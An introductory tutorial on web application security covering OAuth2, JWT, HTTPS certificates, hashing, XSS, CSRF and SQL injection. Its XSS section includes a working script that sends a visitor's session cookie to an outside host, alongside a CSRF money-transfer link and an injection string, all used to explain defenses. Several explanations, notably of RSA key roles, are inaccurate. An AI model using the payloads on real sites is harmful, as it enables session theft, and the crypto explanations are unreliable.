# I Have a High-Level Understanding of How Web Applications Are Secure

Like databases and other areas of technology, security is a vast topic,
but here's an overview.

## Goals of Security for a Web Application

Key goals of security include authentication, authorization, auditing, and encryption.

### Authentication

Authentication notifies a system of who you are. Before doing this systems will consider
you to be an `anonymous` user and reject HTTP requests with a `401 Unauthorized` response.

For traditional internet applications, this authentication is done by successfully
entering a username/password combination, but even that may become less common in the future
since they are messy (different sites require different combinations which are easy to
forget) and unreliable (they can be cracked by 'bots').

  - Fun Fact - During World War II, Germans used the `enigma code` to encrypt messages
  which required a six-character password, but Allies (enemies of Germany) would sometimes
  decrypt these message by guessing easy words (like 'BERLIN' and 'LONDON') because
  the operators of the machines were too lazy or overconfident to think of
  a harder-to-guess password.
    - Takeaway - _Don't forget the human element (and human failings, like laziness)
    when implementing a security system._
    - Reference - https://museumofworldwarii.org/collection/enigma/

Sites can store these username/password combination in a special user database called
`LDAP` . Once a user has authenticated, that user's browser receives a session cookie
which, for the application, assigns the user to the browser.

#### Two-Factor Authentication

With username/password combinations alone frequently not providing a comfortable level
of security, once a user enters the correct combination the user may be asked to enter
a code received on a cell phone. This type of post-login followup to ensure that it's
indeed the user logging in is known as `two-factor authentication` .

#### OAuth2

OAuth2 is a very popular and industry-standard form of authentication. OAuth2 not only
allows you to authenticate directly with an application, but it also allows you
login to more-trusted applications (like Facebook) that then notify the application
that you're using that you are the user (e.g. post a comment on another site by
first logging into Facebook).

##### Exercise - Study TikTok Login Page

Go the the TikTok login page at https://www.tiktok.com/login/ . Notice that there isn't
just a 'Use phone / email / username' option, but there are ways of logging like the
'Log in with Facebook' option.

Click on the 'Log in with Facebook' button which will open a new window. Study the URL
of this new window and notice that the term 'oauth' appears in it. There are other
important terms like 'client_id' and 'response_type' (which has the value of 'token'
which corresponds to `implicit grant flow`).

By logging in through Facebook , TikTok never stores or needs to know your actual
username and password. TikTok trusts a successful login to Facebook and Facebook notifies
TikTok after the user has successfully logged into Facebook after pressing
the 'Log in with Facebook' button.

##### OAuth2 Flows

OAuth2 provides ways of several different HTTP-based ways of authenticating.
Here are a few popular ones (these are known as `grant types` or `flows`).

  - `Authorization Code` - The browser is directed to another site's login page.
  After logging in, that other site redirects the browser to an application-based URL
  with a code. The application then sends this code to the other site to receive
  the login information (like access token - this is the code that allows).
    - Takeaway - For this, the browser does the login but never gets the confidential
    information (like internal user ID).
  - `Implicit` - This is like `Authorization Code` but after logging in, but the browser
  receives all of the login information (token) directly.
  - `Client Credentials` - This isn't used by browsers but by systems trying to communicate
  with each other. The client uses this flow to obtain the token and then use it to call
  the server.

All of these flows consist of one or more HTTP calls. For cases involving more than one
HTTP call, redirect responses (like HTTP `302 Found`) are frequently used (e.g. the
browser is bounced around like a ping-pong ball between the application, the login page,
the page that receives the login, the page that processes the login, then back to the
page where the user clicked the login button).

##### OAuth2 Token

A successful OAuth2 authentication results in the OAuth2 server generating and responding
with a JSON-formatted token like the following.

```
{
  "access_token":"MTQ0NjJkZmQ5OTM2NDE1ZTZjNGZmZjI3",
  "token_type":"bearer",
  "expires_in":3600,
  "refresh_token":"IwOGYzYTlmM2YxOTQ5MGE3YmNmMDFkNTVk",
  "scope":"create"
}
```

Here's an explanation of each field.
  - `access_token` - This is the secret code that can be used to access the application.
  - `token_type` - This generally has `bearer` as its value.
  - `expires_in` - This is the number of seconds before the `access_token` will expire.
  - `refresh_token` - This is a code that can be used to generate a new `access_token`
  after the `expires_in` time is reached.
  - `scope` - Getting an `access_token` doesn't mean you can do everything. The `scope`
  defines what you can do with it.

With an `access_token`, your browser or an application can make authenticated calls
by passing an `Authorization` HTTP request header with the value `Bearer <access_token>` .
Here's an example using the `access_token` above.

```
Authorization: Bearer MTQ0NjJkZmQ5OTM2NDE1ZTZjNGZmZjI3
```

##### AWS Cognito

`Cognito` is the AWS service for hosting users and their assigned groups.
It can create a login page for your application without you having to create this
page and the user database. It also handles different OAuth2 flows.

#### JWT

`JWT` stands for `JSON Web Token` and it's a common way of package authentication
information, which could and often does include an OAuth2 token, along with the packaging
format and a `hash` (in this case, it's like a password) signifying to anyone using it
that it's valid (only the server that issued the `hash` can determine that it's valid).

The three parts of a `JWT` are separated by two periods ('.') with each part being encoded
in Base64 (it's like hexadecimal).

##### Exercise - Decode a JWT

Here's an example of a `JWT` .

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ0b3B0YWwuY29tIiwiZXhwIjoxNDI2NDIwODAwLCJodHRwOi8vdG9wdGFsLmNvbS9qd3RfY2xhaW1zL2lzX2FkbWluIjp0cnVlLCJjb21wYW55IjoiVG9wdGFsIiwiYXdlc29tZSI6dHJ1ZX0.yRQYnWzskCZUxPwaQupWkiUzKELZ49eM7oWxAQK_ZXw
```

Go to https://jwt.io , scroll down to the 'Encoded' text area and enter (copy-paste)
this `JWT` .

The `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` (first) part of the `JWT` is decoded as the
following value with 'alg' value of 'HS256' meaning that this token's third part (the hash)
was constructed using the `HMAC-SHA256` algorithm (approach). This part of the token
is known as the `header` .

```
{
  "alg": "HS256",
  "typ": "JWT"
}
```

The second part of this `JWT` is the `payload` and it contains information that clients
can use.

```
{
  "iss": "toptal.com",
  "exp": 1426420800,
  "http://toptal.com/jwt_claims/is_admin": true,
  "company": "Toptal",
  "awesome": true
}
```

The third part of this `JWT` is the `signature` and only the server that issued the `JWT`
has the secret to generate it. The question 'Why is this needed?' comes to mind and the
answer is that if this `JWT` is sent back to the server then the server can immediately
determine whether it's valid.

#### SAML

`SAML` is used by corporations to provide `SSO` (`Single Sign-On`) (just sign into one
place to use different URLs, instead of having to sign into each new web site). `SAML`
uses `XML` to send and receive messages.

#### CAPTCHA

`CAPTCHA` (`completely automated public Turing test to tell computers and humans apart`)
refers to technology that tries to tell humans and computers (specifically `bots`) apart.
These programs try to conduct the `Turing test` .

The `Turing test` is where something (like `CAPTCHA`) tries to determine whether an action
was done by a human or a computer. In some cases (like creating an email account or a
social-networking profile), the application _does not_ want to accept computer-generated
input because doing so would actually harm the user experience for other _actual_
human users (e.g. would you want to use a social networking application where 90 percent
of the 'people' you interacted with where actually computers?).

`CAPTCHA` has evolved and keeps evolving. It's necessary that it does so because computers
keep getting better and better at pretending to be human!

Another problem with `CAPTCHA` is that people (even prisoners!) can be hired to solve
them.

##### Exercise - Try a CAPTCHA

Go to https://www.google.com/recaptcha/api2/demo and click the "I'm not a robot"
checkbox - that's a `CAPTCHA`!

##### Exercise - Review Popular CAPTCHAs

Go to https://www.letsnurture.com/blog/8-widely-used-captcha-examples.html and quickly
review some of the popular classes of `CAPTCHA` .

### Authorization

Authorization deals with what users _can_ do after logging in. If a system knows who you
are but concludes that your HTTP request is trying to do something you aren't allowed to do,
then the request will be rejected with a `403 Forbidden` response.

Authentication and authorization collectively are known as (`IAM`)
`Identify and Access Management` . AWS has it's own internal IAM (known as `AWS IAM`).

#### Users and Groups

`Groups` are formal collections of zero or more users. Sometimes, groups can even hold
other groups. `Users` can belong to zero or more groups.

`Groups` are important because they allow a very convenient way of managing permissions
and roles. For instance, if each member of a team of 1000 belongs to the 'team1' group
and every member should have access to a web page, it's far easier (and saner) to grant
access to the 'team1' group (just one action) than individually grant access to all
team members (1000 actions).

`UNIX`, `LDAP`, `AWS Cognito`, and `AWS IAM` all support `groups` .

#### Roles and Policies in AWS IAM

`AWS IAM` supports the concept of `policies` which is what a user or a group specifically
can and can't do. Policies are defined in JSON and here's an example for how to give
access (`"Effect": "Allow"`) to all resources (`"Resource": "*"`)
in S3 (`"Action": "s3:*"`). (To _block_ all S3 access, change 'Allow' to 'Deny' .)

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "s3:*",
            "Resource": "*"
        }
    ]
}
```

Within AWS, some parts of systems (like `EC2` which manages virtual computers) need
access to other systems (like `S3` which manages files). These systems aren't users so the
concept of `groups` doesn't apply. Instead, the related concept of `roles` is used
instead. `Roles` are assigned policies just like `groups` and `users` are.

### Auditing

`Auditing` is the recording of which users committed what actions against a system.

If someone did something wrong, it can be discovered with a good audit system.

Application logs are a somewhat (somewhat) reliable way of tracking actions. They can be
useful but may be incomplete and have an easier time being changed. (Audit sources
should not be changed.) In `AWS`, logs are stored in `CloudWatch` .

Formal auditing outside the application is better because it's more consistent
and less prone to tampering. `UNIX` has auditing programs (including when the `sudo`
command is used) and `AWS` uses `CloudTrail` for auditing.

### Encryption

Encryption is the attempt to prevent unauthorized people from understanding what is publicly
visible. The `HTTP` protocol is unencrypted while the `HTTPS` protocol is.

#### HTTPS

`HTTPS` uses `public-key encryption` to encrypt messages.

##### Public-Key Encryption

Central to `public-key encryption` is that it's very hard to factor the product of two
very large prime numbers, but it's relatively easy to stumble on those prime numbers.

  - Example - A computer could randomly pick several large numbers and do some
  (not utterly perfect, but quite reliable) checks on them to determine that the numbers
  101281 and 89839 are prime numbers. Finding these numbers and multiplying them together
  (101281*89839 = 9098983759) doesn't take a computer very long _but_ it would take another
  computer much longer to figure out that 9098983759 is the product of 101281 and 89839.
    - Takeaway - It's much easier for the encrypt program to 'outrace' the decrypt program.
    If the decrypt program can decrypt a large number like 9098983759, the encryption
    program can spend slightly more time creating much bigger prime numbers.
    - Analogy - For this type of encryption, it's far easier to scramble the egg
    than to unscramble it.
  - Note - At present, key sized for `HTTPS` are 2048 bits (string of 0s and 1s) in length.
  This is a number with over 600 digits!

Clients then encrypt messages with the product (`public key`) of the two very large prime
numbers while the server decrypts the message with one of the prime numbers (`private key`).

For convention contemporary computers, it's practically impossible to break a call made
over `HTTPS` .

Note that (as of 2020) the nascent field of `quantum computing` may have the potential
of cracking computationally-difficult problems like finding private keys.

##### Certificates

While engaged in an HTTPS-based conversation with a client, a server will present
a `certificate` containing identification information about a server as well as its
public key. The goal identification information is to assure that the server is what it
states what it is. (The client (browser) wants to ensure that it isn't dealing with an
impostor.)

###### Exercise - Study the Certificate of Google

  - Open Chrome and go to https://www.google.com
  - Click the lock icon just to the left of the address bar
  - Note that 'Connection is secure' is stated meaning that the browser trusts the certificate
  - Click the 'Certificate (Valid)' option
  - Note the top part of the window listing 'GlobalSign', 'GTS CS 101', and '*.google.com'
    - These three components come together to form a valid `certificate chain`
    - Think of 'GlobalSign' as the root of a tree, 'GTS CS 101' as a branch, and
    '*.google.com' as a leaf - 'GlobalSign' created each of these three certificates
      - The browser wants the leaf to be valid and to determine that it assesses
      whether the branch and root are also valid
      - 'GlobalSign' is known as a `root certificate authority`
        - On Mac, using the 'Keychain Access' program and looking at 'All Items'
        of the 'System Roots' keychain, search for ones labeled 'GlobalSign'
        and note that one of them will start with the same public-key value
        (like 'A6 CF 24 0E') as the 'GlobalSign' certificate
          - The certificate manager program (which is 'Keychain Access' in Mac) can be
          opened by opening Chrome setting, clicking 'You and Google', under
          'Privacy and security' click 'More', scroll down and click 'Manage certificates'
      - Since each certificate chain is trusted by the next most-senior certificate
      and your system trusts the root certificate, then the '*.google.com'
      certificate is also trusted
  - Click on the '*.google.com' certificate, click the 'Details' arrow, scroll down
  to 'Public Key Info' and note the 'Public Key' value

###### Exercise - Start Local Server with Self-Signed Certificate

In this exercise, you will create a local (Docker-based) Node.js HTTPS-based web server
using a `self-signed certificate` which is a certificate that you will wholly create
and not have the backing of a valid `root certificate authority` - your browser will complain.
Lacking a `root certificate authority` and using a `self-signed certificate` instead
is like showing up to an international airport with a homemade passport.

  - Download base Linux Docker image with this command - `docker pull alpine`
  - Run that image and start a shell with this command - `docker run -p 8000:8000 -it alpine sh`
  - Update the installer by running `apk update` then `apk upgrade`
  - Run `apk add --update nodejs npm` to install both Node.js and NPM
    - Node.js is needed to run a local server, NPM may or may not be needed
  - Run `apk add --update openssl` to install OpenSSL
    - OpenSSL is used to generate `public keys`, `private keys`, and `certificates`

Now generate the `private key` with command `openssl genrsa -out key.pem` - note that you
absolutely do _Not_ want the contents of the 'key.pem' (private key) file that's created
to be viewable by anyone who's not supposed to properly need it. Run `cat key.pem` to view
the contents of this file. Here is an example of what the contents could be.

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEApchplDbDcXg8eRSWViFWYB7Aq+o/vub3kQzSScwHi3KZt7sc
j6LoxR7OLiqo62xXc5hXQ3LuwdXgrb4UzjFQCMLxXxEUuEA2flU2aBffU4FCVnnw
nhGDFrMf53H5wdrpX87hTpSlqFFAmfXL0eGV+bNId4yVqLGUNWZyCRaVnj3HWXV2
ichKOea0gHVvVkJKiWfM7RxCrL0Uk2Jy7y0TvzljCJlhRvgMq9wdx0pexPxiN3+F
poc00bRBU1CyDOcPR1VCHWsDhAMxfyf1yHpFZBq2x/15evI7uCFLnEnNI9dKw3Uq
J2Z7GBIOSCrWvD9NHSmXmFhutZbX1zHRYl0zHQIDAQABAoIBAQCfwTsMmqFITSdp
Po+IvGNyCPB+OiPnoMbcvlA+0SBMHslGpkblm4VXv1HMZ0uUYjj7qcgdtTmjDKmQ
g+WktRx89O6IP/uJekeJAjCFqsuIurzkfGmEyTdbvo12CP028++EZeX0RYZFZtcs
BhK9U/ekQkIJAi6N+2Ho+6nUXDEd5LkcXyr9rJz3GVlGqD3m/sAU01wNXniZn+tW
nb9frcxgddrK+QjQi1bHRK096b0Fxn5o7hrewFFNCtuxQgkOEAnids8dYXPXr8Pp
q5xqEPf/Wz9D4XCkSzmkLCdHQrWQhuRfcPu4NjMQpx1yi3iPw3Z2OhSSdgFGoSAI
rYwNMoDBAoGBANhBYjL8mWELsTY4NDwsZqr1semHkBYNkr0WHq0IizbFrH5PoCs/
yfdJIXP/xu9lgJvs4pheMtXNQzxpRWROaYnQaOnjoVpgb+9RYYx20/h43RBDBmt8
DxeVD1pmq0zuMQMK9n6olDWsI4W73mSTWMCzD1krDrNExz/9VQmNnQAZAoGBAMRA
V6iUYDt2GAvqF4bZSUbJ/YDgHA1kfeHYE6pIOLquMXz4xw+cIeKPMvzZ4VpQAkWP
Yk4Fmk+86UtM2OiEgvQPeydxs1hGAglVabSixb1jaIbZJaLmq/S4elcmvhdSd/n6
zlFvpzeJ5zp6N0YNQUqFSrBlL8YsBzB+WbWFpZulAoGBAJNLRXVw849UBWnmsj1i
CLPdEUb8nLlImW/NByvYK+osjaai2XdbxVZ3Kx/1USxxuD18BYK+dmWFn4wgL7F4
bw39M9hKwPXrxZH9njGsJgiRWhDfdhnzr9viHUj3sSl++0cVSntOm1RLYQ6PvZRH
gCYQUB3t499as1P0Wt1c5VjRAoGAbsdrM+vdjnMRC9iuQx5wcJcglBjtfNnW/R89
qoduDmK56LN9mmAl+H+g5n4O6S30ulM/yI79Fjmq7yiH4Gi8iwwaFp/l/tQ13hLq
wl6HhGqS3FvDFPtk4ZUo6f0inIOe2esrf2ipWX5smePXQ6HD007+ZCgaGaFMxaDs
/rxcSUkCgYBTRqP/2Z9kFL4PbdGRAhy2vLOFlhOW9Bc0jhyYfxngMrAT21vUKut4
wZaLqo1xxzhONcWS/bVaHYW4kLbhcUjN4ghT2uvnsw4cyTyY/NRmKJaZ4iap5Zgo
bXg7CJ4PG1fDvRMKja2XioxNYsSu3mMmLOdOjTSPdXufJx1ivJ9zCg==
-----END RSA PRIVATE KEY-----
```

Now generate an intermediary certificate-information file with command
`openssl req -new -key key.pem -out csr.pem` and just accept (press enter or return)
the default values for all the prompts. View the contents of file with the `cat csr.pem`
command. Here is an example of what the contents could be.

```
-----BEGIN CERTIFICATE REQUEST-----
MIICijCCAXICAQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
AQEBBQADggEPADCCAQoCggEBAKXIaZQ2w3F4PHkUllYhVmAewKvqP77m95EM0knM
B4tymbe7HI+i6MUezi4qqOtsV3OYV0Ny7sHV4K2+FM4xUAjC8V8RFLhANn5VNmgX
31OBQlZ58J4RgxazH+dx+cHa6V/O4U6UpahRQJn1y9HhlfmzSHeMlaixlDVmcgkW
lZ49x1l1donISjnmtIB1b1ZCSolnzO0cQqy9FJNicu8tE785YwiZYUb4DKvcHcdK
XsT8Yjd/haaHNNG0QVNQsgznD0dVQh1rA4QDMX8n9ch6RWQatsf9eXryO7ghS5xJ
zSPXSsN1KidmexgSDkgq1rw/TR0pl5hYbrWW19cx0WJdMx0CAwEAAaAAMA0GCSqG
SIb3DQEBCwUAA4IBAQBZpd4kIFXlF+7D0dMGlPdmdwEiIbUA7VnKaJXvlIfQvsi6
mttvScDJfHH2q25Dod2VEt5t6WeSGFtKG2/knIN4PASb2C0jAjnKMk5RRWRpH4Nf
tqTjRsLL2lRUsubvnIz/HC2MNu45r/VvtvHbSp4YojBEwAxJOYZxsp6FO0InWKPk
VLmbtvVs2m2bmGeYLA8btDd8jxKWIipBiczzgfR8CMzLn88Mk+l3yVyJj7AY1BIk
IcEjv0EEzeDWTQsqPwM1udDEPecbwdiaEHFZ9eVdG7XJdbAyeaGBGXdGIha+ZGkL
3hws0cKDmgmYmBS3hy2jWQMO2v6dL2hE8uU3YXNP
-----END CERTIFICATE REQUEST-----
```

Now create the certificate with this command.

```
openssl x509 -req -days 9999 -in csr.pem -signkey key.pem -out cert.pem
```

View the certificate with command `cat cert.pem` .
Here is an example of what the contents could be.

```
-----BEGIN CERTIFICATE-----
MIIDETCCAfkCFAWNBRAZ2YBHZfWEWbWdiheK05YwMA0GCSqGSIb3DQEBCwUAMEUx
CzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRl
cm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMjAwNTI1MTgzMDU0WhcNNDcxMDEwMTgz
MDU0WjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UE
CgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOC
AQ8AMIIBCgKCAQEApchplDbDcXg8eRSWViFWYB7Aq+o/vub3kQzSScwHi3KZt7sc
j6LoxR7OLiqo62xXc5hXQ3LuwdXgrb4UzjFQCMLxXxEUuEA2flU2aBffU4FCVnnw
nhGDFrMf53H5wdrpX87hTpSlqFFAmfXL0eGV+bNId4yVqLGUNWZyCRaVnj3HWXV2
ichKOea0gHVvVkJKiWfM7RxCrL0Uk2Jy7y0TvzljCJlhRvgMq9wdx0pexPxiN3+F
poc00bRBU1CyDOcPR1VCHWsDhAMxfyf1yHpFZBq2x/15evI7uCFLnEnNI9dKw3Uq
J2Z7GBIOSCrWvD9NHSmXmFhutZbX1zHRYl0zHQIDAQABMA0GCSqGSIb3DQEBCwUA
A4IBAQCdKceMUxpqXyP5pTERwO6LJW99qJ4C11Hw2BIG3L+qUI8YZPjfgWoa3VRs
dluqSaUuvF1lrzr1XpbC0KKrBg6yQDOc3yrQC27moBSnxuWbAlRltN+1/UpBg9mP
qZd/GuH5GeW34kpXKCMkMBCvD99GVXzHHZ7Ar/nrbWLH+eInciwBLeuwMo79B/Ec
xpHkx0ACRDwpIooFEoVBIKvJnYPPft43ZoXhlltibEcfu0/pGMzOoFKxzHy4xNR4
kWnHF2UR8kHDuEpanr4rdedZEI8lOhkgCihMZTv8KSp0c5Ii2j4nwa+3TdMKJWuC
x4+xRSS0m1QmKt4ayZShU4A57LWL
-----END CERTIFICATE-----
```

Notice here that the contents _don't really make sense to the human reader_ .

Important Note - It's okay for the public to view the `certificate` (which contains
the `public key`) but _it's not okay_ for the public to view the `private key` .

Now (using 'vi') create a file 'webserver.js' with the following contents.

```
const https = require('https');
const fs = require('fs');

const options = {
  key: fs.readFileSync('key.pem'),
  cert: fs.readFileSync('cert.pem')
};

https.createServer(options, function (req, res) {
  res.writeHead(200);
  res.end("hello world\n");
}).listen(8000);
```

Run this local server with command `node webserver.js &` (the `&` character means that
the web server will run in the background so that you can keep typing other commands).

Install the `curl` command by using command `apk add --update curl` .

Now run command `curl https://localhost:8000` - instead of getting 'hello world'
in the response, the following error message is displayed instead because the 'curl'
command doesn't trust the self-signed certificate.

```
/ # curl https://localhost:8000
curl: (60) SSL certificate problem: self signed certificate
More details here: https://curl.haxx.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the web page mentioned above.
```

`curl` has the '--insecure' option which will allow it to accept invalid or self-signed
certificates. Running `curl --insecure https://localhost:8000` will give the expected
'hello world' response.

Now open Chrome and go to https://localhost:8000 . The web page should not display, instead
message 'Your connection is not private' should appear with error code
'NET::ERR_CERT_AUTHORITY_INVALID' . Click the 'Advanced' button then click the
'Proceed to localhost (unsafe)' link to view the simple web page with 'hello world' .

In the Docker shell, enter `exit` to leave and stop the Docker container.

## Hashing

Hashing is about taking something and scrambling it up ... just for the sake of mixing it up!

### Exercise - Use SHA-256

There are many different approaches to hashing. Each approach (to scrambling) usually
produces a wildly different result from another approach.

SHA-256 is a very popular approach to hashing. The Unix `sha256` command executes this
hashing algorithm. Follow these steps.

  - Download base Linux Docker image with this command - `docker pull alpine`
  - Run that image and start a shell with this command - `docker run -it alpine sh`
  - Update the installer by running `apk update` then `apk upgrade`
  - Run `apk add --update outils-sha256` to install the `sha256` command
  - Execute command `echo -n Hello`
    - 'Hello' won't be printed on its own line because of the '-n' option
    - Putting 'Hello' on it's own line would include an invisible whitespace character
    (a 'carriage return') that shouldn't be included in this hashing example
  - Execute command `echo -n Hello | sha256`
    - Confirm that the output is `185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969`
  - Execute command `echo -n hello | sha256`
    - Confirm that the output is `2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824`
  - Execute command `echo -n MyFavoriteFoodIsPeanutButterAndJellyWithWhippedCream | sha256`
    - Confirm that the output is `984a5f6b7a87bd913d4efe25fa42b74b29292f492dadb8ff6b429d196a55206d`

Notice how these instructions knew what the result would be ahead of time, that small
differences in the input produced wildly different outputs, and that the length of each output
was the same size.

Repeat this exercise by going to one of the following web sites.

  - https://emn178.github.io/online-tools/sha256.html
  - https://xorbin.com/tools/sha256-hash-calculator

Submit the same inputs used by the `sha256` command into the web form. Notice how the same
hashes are produced.
  - Hello
  - hello
  - MyFavoriteFoodIsPeanutButterAndJellyWithWhippedCream

SHA-256 is a well-known hashing algorithm that produces consistent results.

### Hashing Versus Encryption

Hashing and encryption have these things in common.

  - Consistent Result - A given hashing or encryption algorithm will generally produce
  the same output when given the same inputs
  - Scrambles Things Up - A given hashing or encryption algorithm will produce output
  that isn't readable

Hashing and encryption differ in the following ways.

  - Consistent Output Size - Hashing algorithms tend to produce output with a predefined
  fixed length (for instance, SHA-256 _always_ produces output that can be represented
  by 64 hexadecimal digits), encryption algorithm output has to adjust to whatever the input
  is (it's quite unlikely that megabytes of input would produce output that's only
  64 hexadecimal digits in length)
  - Can't Be Unscrambled - Hashing produces something that's scrambled but
  unlike encryption it can't be unscrambled, in fact two or more inputs could have
  the same hash so any attempt to 'decrypt' in that circumstance wouldn't be able to know
  the original input, the inability to unscramble can be a 'good thing' in some instances
  (like storing previous passwords to an account without actually storing the password)

### How on Earth Is Hashing Useful?

Hashing is actually quite useful. Here are important use cases.

  - Generating Unique Identifiers in Distributed Systems - When data is consolidated
  all in one database it's easy to assign unique identifiers (like 1, 2, 3, ...) but this
  can't be done when many different programs are updating distributed data so each assigns
  a hash value to new entries that _probably won't_ collide with other entries elsewhere,
  both `Git` and `Bitcoin` manage distributed data and both use `SHA-256`
  - Validation of Transmission - When data is transmitted from one system to another it's
  impractical for the receiver to know 'Did I get everything okay?' by having followup
  calls to confirm the correctness of each-and-every byte transferred, but the sender can
  send a hash of what was sent and the receiver then compare that hash to the one it generated
  to determine if the values are the same (if not, a transmission error occurred)
  - Detect Presence of Something - `Java` has a `hashCode()` function for all of it objects
  which can be used to quickly check whether (for instance) an object is not in a set
  - Detect Past Use of Something - When a system asks a user to change a password it often
  requires that the user not use a recent previous password but it's probably wise not
  to store previous passwords, instead the hashes of previous passwords can be stored
  and the hash of a candidate new password can be compared against them
  - Validity of Data - A `JWT` includes a hash at the end of it which only the server
  can generate, if the server receives a `JWT` it can quickly check whether it's valid or not

## Web-Browser Security

Web browsers and web standards like the following try to protect browser users
from security attacks.

  - CORS - This prevents web servers from receiving unexpected web-service calls
  - 'HttpOnly' Cookie - This flag can be used when declaring the server declares a cookie
  for the client to use but ensures that the cookie isn't accessible by JavaScript

### Browser-Based Client-Server Vulnerabilities

HTML and JavaScript allow a lot of flexibility which give the browser a lot of power
but can also open it up to attack.

Here are common attack vectors and some countermeasures for those classes of attack.

#### Cross-Site Scripting (XSS)

Many web sites incorporate user-generated content, the most classic example being
users posting comments to a news article.

A bad user could decide to post a comment that, for instance, gets another user's session
cookie and sends that cookie to a malicious web site that then uses that cookie
to do bad things to that other user's account.

Here's an example which can be tried at
https://www.w3schools.com/html/tryit.asp?filename=tryhtml_basic .

```
<html>
  <head>
    <script>
      document.cookie = "userSession=123";
    </script>
  </head>
  <body>
    <h1>What is your opinion of the game 'Purple Martians'?</h1>
    <div>
      <h2>Comment 1 - This is a really cool game.</h2>
      <p>
        I recommend this game to all of my friends.
      </p>
    </div>
    <div>
      <h2>Comment 2 - HaHa you fool - I'm stealing your session token to buy
      games with your credit card.
      </h2>
      <p>
        Gimme your session token in 5 seconds.
        <script>
          setTimeout(
            function() {
              window.location.href = "https://postman-echo.com/get?userSession=" + document.cookie;
            },
            5000
          );
        </script>
      </p>
    </div>
  </body>
</html>
```

The above HTML page asks users to post comments about the video game 'Purple Martians'
and the comment of the first user is a benign 'I recommend this game to all of my friends.'
but the second user is malicious and posted this comment.

```
        Gimme your session token in 5 seconds.
        <script>
          setTimeout(
            function() {
              window.location.href = "https://postman-echo.com/get?userSession=" + document.cookie;
            },
            5000
          );
        </script>
```

This isn't a valid comment (good or bad) about a video game, but an attempt to change
the functionality of the web page by maliciously sending the user's session cookie
to 'postman-echo.com' (which is actually a friendly website). The owner of that website
can then use the user's session cookie to act like the user (including purchasing
video games with the user's credit card!). Scan the resulting web page and notice that
'userSession=123' (the user's session cookie) appears in it.

Note that _any_ user visiting this site will have his/her session cookie stolen.

##### Countermeasure for XSS

A partial solution for the above case would be for the server to an `HttpOnly` cookie
for 'userSession' so that JavaScript can't access it.

But one of the best countermeasure is to `escape` user comments on the server while
generating the HTML page. `escaping` means taking each character in a comment and
(if necessary) converting special HTML characters (like '<' and '>') into a sequence
of characters (which are '&lt;' for '<' and '&gt;' for '>') that just print the character
to the web page. Everyone will see what the user typed in but what got typed in won't
have an active component (the 'sting' will be taken out - the trap has been disarmed).

For the above bad comment, its `escaped` form is the following.

```
        Gimme your session token in 5 seconds.
        &lt;script&gt;
          setTimeout(
            function() {
              window.location.href = &quot;https://postman-echo.com/get?userSession=&quot; + document.cookie;
            },
            5000
          );
        &lt;/script&gt;
```

Here's the whole updated web page which is now benign in spite of XSS attack attempt.

```
<html>
  <head>
    <script>
      document.cookie = "userSession=123";
    </script>
  </head>
  <body>
    <h1>What is your opinion of the game 'Purple Martians'?</h1>
    <div>
      <h2>Comment 1 - This is a really cool game.</h2>
      <p>
        I recommend this game to all of my friends.
      </p>
    </div>
    <div>
      <h2>Comment 2 - HaHa you fool - I'm stealing your session token to buy
      games with your credit card.
      </h2>
      <p>
        Gimme your session token in 5 seconds.
        &lt;script&gt;
          setTimeout(
            function() {
              window.location.href = &quot;https://postman-echo.com/get?userSession=&quot; + document.cookie;
            },
            5000
          );
        &lt;/script&gt;
      </p>
    </div>
  </body>
</html>
```

#### Cross-Site Request Forgery (CSRF)

CSRF can be one of the following.

  - When one web site constructs a URL stated to be for one thing but the link does
  something else that the user didn't expect on another web site.
  - One web site makes an invisible call to another web site (like by using `AJAX`).

For the first case, the user could be presented with the following URL.

```
<a href="https://mybank.gov?action=transferMoney&amount=30&toAccount=badAccount">Click here for free video games</a>
```

The user may click on this link thinking he/she will get free video games, but instead
the user is fooled into transferring 30 dollars into `badAccount` if the user had already
logged into 'myback.gov' but hadn't logged out yet.

##### Countermeasure for CSRF

A `CSRF Token` is a code that a web site places on a web page for the user to include
to calls back to the web site.

So if the user is at 'mybank.gov' and that web page includes a JavaScript variable
'csrfToken' (with value of '789', for instance), then the user correctly submits that
token value when performing actions (like 'transferMoney') when on that web site.

But, if the user is fooled into clicking the 'Click here for free video games' link
on the bad web site, the 'csrfToken' isn't sent and that action is rejected.

#### SQL Injection

Imagine a web page constructing its list of bank account transactions with the following
statement and the 'accountId' value comes from an HTML form field.

```
var sqlStatement = "select * from transactions where accountId=" + accountId;
getData(sqlStatement);
```

Honest users would enter in a valid value (like '123' which would result in statement
'select * from transactions where accountId=123'), but a malicious attacker could
try to add extra query information with a value like '123 or accountId=456' would would
result in statement 'select * from transactions where accountId=123 or accountId=456'
giving that attacker unauthorized information.

##### Countermeasure for SQL Injection

Use a `prepared statement` which explicitly delineates the custom parts of a query.
Here's an example.

```
var sqlStatement = "select * from transactions where accountId=?";
getDataWithParameter(sqlStatement, accountId);
```

For the malicious attacker the resulting query would be
'select * from transactions where accountId="123 or accountId=456"' which wouldn't
be valid.

## Network Security

Network security is a vast subject but here are samples of key topics.

### Adversaries
Adversaries can attempt to attack a server in many ways including the following.

  - `Denial-of-Service Attack` - This is when an adversary overwhelms a server with bogus
  calls.
  - `Brute-Force Attack` - This is when an adversary attempts to try different combinations
  of something (like a password) in an attempt to break in to a system

### Blacklists and Whitelists

A network or an application can decide to outright reject (`blacklist`) some IPs or decide
to accept only certain IPs (`whitelist`).

## Human Element

It's difficult or impossible to 'human-proof' a system.

